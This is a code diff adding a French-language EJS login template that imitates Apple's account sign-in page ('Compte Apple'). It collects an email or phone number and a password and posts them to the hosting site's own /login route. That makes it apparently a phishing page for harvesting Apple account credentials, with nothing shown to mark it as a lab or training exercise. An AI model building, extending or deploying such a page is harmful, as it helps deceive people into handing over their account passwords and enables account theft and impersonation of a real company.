@@ -1,0 +1,66 @@
+<div class="login-container">
+  <div class="login-box">
+
+    <div class="login-header">
+      <h1>Compte Apple</h1>
+      <p class="subtitle">Gérer le compte Apple</p>
+    </div>
+
+    <!-- Calcul de l'erreur une seule fois -->
+    <% let hasError = (typeof error !== 'undefined' && error && error.length > 0) || (typeof errorMsg !== 'undefined' && errorMsg && errorMsg.length > 0); %>
+
+    <!-- On ajoute la classe 'shake' au formulaire s'il y a une erreur -->
+    <form action="/login" method="POST" class="<%= hasError ? 'shake' : '' %>">
+
+      <!-- Message d'erreur -->
+      <% if (hasError) { %>
+        <p class="error-message">
+          <%= (typeof error !== 'undefined' && error) || errorMsg %>
+        </p>
+      <% } %>
+
+      <div class="input-group">
+        <input 
+          type="email" 
+          name="email" 
+          placeholder="E-mail ou numéro de téléphone" 
+          class="input-field <%= hasError ? 'input-error' : '' %>" 
+          value="<%= typeof formData !== 'undefined' && formData?.email ? formData.email : '' %>" 
+          required 
+        >
+        <span class="error-icon">⚠️</span> 
+      </div>
+
+      <div class="input-group">
+        <input 
+          type="password" 
+          name="password" 
+          placeholder="Mot de passe" 
+          class="input-field <%= hasError ? 'input-error' : '' %>" 
+          required 
+        >
+        <span class="error-icon">⚠️</span> 
+      </div>
+
+       <div class="forgot-password-wrapper">
+          <a href="/forgot-password" class="forgot-password-link">
+          Mot de passe oublié ?
+        </a>
+    </div>
+
+      <div class="info-section">
+        <img src="/images/icone-bleue.png" alt="info" class="privacy-icon">
+        <p>
+          Les informations de votre compte Apple sont utilisées pour vous permettre de vous connecter en toute sécurité... 
+          <a href="#">Découvrez comment sont gérées vos données…</a>
+        </p>
+      </div>
+
+      <button type="submit" class="btn-continue">Continuer</button>
+
+    </form>
+  </div>
+</div>
+
+
+<script src="/js/script.js"></script>
